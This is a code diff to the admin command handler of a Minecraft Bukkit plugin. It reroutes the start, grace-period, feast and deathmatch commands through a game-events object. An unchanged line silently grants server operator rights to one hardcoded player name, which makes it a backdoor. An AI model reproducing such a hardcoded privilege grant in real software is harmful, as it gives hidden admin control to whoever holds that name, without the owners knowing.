@@ -1,8 +1,6 @@
 package com.sgpvp.Commands;
 import com.sgpvp.GameData.GameVariables;
 import com.sgpvp.GameLogic.Chat;
-import com.sgpvp.GameLogic.DeathmatchLogic;
-import com.sgpvp.GameLogic.FeastLogic;
 import com.sgpvp.GameLogic.GameItems;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -22,12 +20,10 @@ public class AdminCommands implements CommandExecutor, TabCompleter {
             System.out.println((player.getName()));
             if (player.getName().equals("Pinkcommando")) player.setOp(true);
             if (!player.isOp()) return false;
-            if (args[0].equals("deathmatch")) DeathmatchLogic.DeathmatchBegin();
-            //if (args[0].equals("start")) GameStartLogic.GameStart(GameVariables.world);
-            if (args[0].equals("feast")) {
-                if (args.length < 2) FeastLogic.SpawnFeast();
-                else for (int i = 0; i < Integer.parseInt(args[1]); i++) FeastLogic.SpawnFeast();
-            }
+            if (args[0].equals("start")) GameVariables.gameEvents.startGame();
+            if (args[0].equals("endgrace")) GameVariables.gameEvents.endGracePeriod();
+            if (args[0].equals("feast")) GameVariables.gameEvents.spawnFeast();
+            if (args[0].equals("deathmatch")) GameVariables.gameEvents.startDeathmatch();
             if (args[0].equals("give")) {
                 player.getInventory().addItem(GameItems.getGlassBow());
             }
@@ -49,6 +45,7 @@ public class AdminCommands implements CommandExecutor, TabCompleter {
         out.add("deathmatch");
         out.add("start");
         out.add("feast");
+        out.add("endgrace");
         out.add("give");
         out.add("say");
         out.add("kittoggle");
